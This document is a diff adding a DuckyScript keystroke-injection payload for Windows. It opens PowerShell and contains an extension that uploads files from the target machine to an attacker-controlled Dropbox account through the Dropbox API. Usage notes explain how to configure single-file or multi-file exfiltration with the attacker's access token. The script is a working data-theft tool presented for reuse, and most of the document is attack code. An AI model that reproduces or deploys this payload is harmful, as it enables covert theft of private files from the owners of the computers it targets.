@@ -1,0 +1,126 @@
+REM Init payload
+
+REM I don't use the detect ready extension so as not to divert attention, but it would be best
+DELAY 3000
+GUI r
+DELAY 500
+STRING powershell
+DELAY 500
+ENTER
+DELAY 2000
+
+REM This is simply an example so to get the full path I use this command, but of course you use whatever way you see fit to get the path to your file(s)
+STRINGLN $files = Get-ChildItem -Path .
+STRINGLN $dropboxFilePath = $files.FullName[0]
+
+REM At this time you need the variable $dropboxFilePath to contain the path to the file you want to exfiltrate
+
+
+EXTENSION SEND_FILES_THROUGH_DROPBOX_WINDOWS
+    REM VERSION 1.0
+    REM AUTHOR: Aleff
+
+    REM_BLOCK Documentation
+        This extension is used to send one or more files through the Dropbox API.
+
+        TARGET:
+            Windows PowerShell
+
+        USAGE:
+            Insert this extension when you have one or more files that you want to send via Dropbox.
+
+
+        CONFIGURATION:
+            Set #DROPBOX_ACCESS_TOKEN with a string - the string must be your personal Dropbox access token created from your Dropbox account.
+
+            Set #FLAG-SINGLE-FILE with TRUE if you want to send just one file.
+            In this case you will need to specify the file path within the #SINGLE-PATH variable OR, in case the exact path to the file you can only acquire it at runtime and so via the powershell, use in the powershell the $dropboxFilePath variable to capture this path.
+                i.e. in DuckyScript EXTENSION
+                    DEFINE #SINGLE-PATH C:\Users\Aleff\Downloads\photo.png
+                i.e. in PowerShell before extension
+                    $dropboxFilePath = "C:\Users\Aleff\Downloads\photo.png"
+
+            Set #MULTIPLE-FILES TRUE if you want to send multiple files. In this case in the PowerShell you will have to create the variable $dropboxFilePaths, which is an array of strings that should contain the list of paths related to the files you want to export.
+                i.e. in PowerShell before extension:
+                    $dropboxFilePaths = @(
+                        "C:\Users\Aleff\Downloads\photo.png",
+                        "C:\Users\Aleff\Downloads\document.pdf",
+                        "C:\Users\Aleff\Downloads\song.mp3"
+                    )
+                Some tips:
+                    How to create an Array?
+                        > $dropboxFilePaths = @()
+                    How to add an element?
+                        > $dropboxFilePaths += "C:\Users\Aleff\Downloads\photo.png"
+                    How to see the array?
+                        > $dropboxFilePaths
+
+
+    END_REM
+
+    REM Settings
+
+    DEFINE #DROPBOX_ACCESS_TOKEN my-personal-dropbox-access-token
+    DEFINE #FLAG-SINGLE-FILE FALSE
+    DEFINE #SINGLE-PATH 0
+
+    REM From now don't change anything else.
+
+    DEFINE #UPLOAD-URL $uploadUrl="https://content.dropboxapi.com/2/files/upload"
+
+    DEFINE #CREATE-HEADERS $headers=@{}
+    DEFINE #HEADERS-ADD-AUTH $headers.Add("Authorization","Bearer $accessToken")
+    DEFINE #HEADERS-USING-VAR-IN-POWERSHELL $headers.Add("Dropbox-API-Arg", '{"path":"$dropboxFilePath","mode":"add","autorename":true,"mute":false}')
+    DEFINE #HEADERS-CONENT-TYPE $headers.Add("Content-Type", "application/octet-stream")
+    
+    DEFINE #SEND-REQUEST-USING-VAR-IN-POWERSHELL Invoke-RestMethod -Uri $uploadUrl -Headers $headers -Method Post -Body $dropboxFilePath;
+
+
+    FUNCTION SINGLE-FILE-EXFILTRATION()
+
+        STRINGLN #UPLOAD-URL
+        STRINGLN #CREATE-HEADERS
+        STRINGLN #HEADERS-ADD-AUTH
+
+        IF ( #SINGLE-PATH != 0 ) THEN
+
+            STRINGLN $headers.Add("Dropbox-API-Arg", '{"path":"#SINGLE-PATH","mode":"add","autorename":true,"mute":false}')
+            STRINGLN #HEADERS-CONENT-TYPE
+            STRINGLN Invoke-RestMethod -Uri $uploadUrl -Headers $headers -Method Post -Body #SINGLE-PATH
+            
+        ELSE IF ( #SINGLE-PATH == 0 ) THEN
+        
+            STRINGLN #HEADERS-USING-VAR-IN-POWERSHELL
+            STRINGLN #HEADERS-CONENT-TYPE
+            STRINGLN #SEND-REQUEST-USING-VAR-IN-POWERSHELL
+
+        END_IF
+
+    END_FUNCTION
+
+    FUNCTION MULTIPLE-FILES-EXFILTRATION()
+        
+        STRINGLN foreach ($dropboxFilePath in $dropboxFilePaths) {
+        STRINGLN #CREATE-HEADERS
+        STRINGLN #HEADERS-ADD-AUTH
+        STRINGLN #HEADERS-USING-VAR-IN-POWERSHELL
+        STRINGLN #HEADERS-CONENT-TYPE
+        STRINGLN #SEND-REQUEST-USING-VAR-IN-POWERSHELL
+        STRINGLN }
+
+    END_FUNCTION
+    
+    IF ( #DROPBOX_ACCESS_TOKEN != 0) THEN
+
+        STRINGLN #UPLOAD-URL
+
+        IF_DEFINED_TRUE #FLAG-SINGLE-FILE
+            SINGLE-FILE-EXFILTRATION()
+        END_IF_DEFINED
+
+        IF_NOT_DEFINED_TRUE #FLAG-SINGLE-FILE
+            MULTIPLE-FILES-EXFILTRATION()
+        END_IF_DEFINED
+    END_IF
+
+END_EXTENSION
